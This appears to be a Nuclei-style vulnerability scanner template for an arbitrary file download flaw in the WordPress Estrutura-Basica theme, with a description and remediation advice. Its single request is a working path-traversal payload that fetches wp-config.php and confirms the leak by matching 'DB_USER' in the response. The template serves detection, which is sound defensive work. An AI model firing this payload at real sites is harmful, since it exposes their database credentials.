id: Wordpress-Estrutura-Basica_Plugins-FileDisclosure
info:
  name: WordPress Estrutura-Basica File Disclosure
  author:
  - l0ne1y
  description: |-
    WordPress Theme Estrutura-Basica 'download.php' arbitrary file download vulnerability
    WordPress is a blog platform developed by the WordPress Software Foundation using the PHP language. The platform supports the establishment of personal blog websites on PHP and MySQL servers. Estrutura-Basica is one of the basic structural themes.

    The WordPress Estrutura-Basica theme 'download.php' has an arbitrary file download vulnerability. Because the program failed to adequately sanitize user-submitted input. An attacker can exploit this vulnerability to download arbitrary files in the context of the web server process.
  severity: high
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://wordpress.org/themes/

    Temporary fix:
    1. Filter \".\" so that users cannot go back to the upper directory in the URL.
    2. Regular matching strictly determines the format of user input parameters, hard-codes or uniformly encodes the file name parameters passed by the user, performs whitelist control on file types, and rejects parameters containing malicious characters or null characters.
    3. Prohibit the system from providing directory traversal services, such as: php.ini configures open_basedir to limit file access scope.
    4. Save the file path to the database and let the user submit the file corresponding to the ID to download the file.
    5. Verify permissions before users download files.
requests:
- matchers:
  - type: dsl
    dsl:
    - ' contains(body,"define") && status_code==200 && contains(body,"DB_USER")'
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/themes/estrutura-basica/scripts/download.php?arquivo=../../wp-config.php'
  method: GET
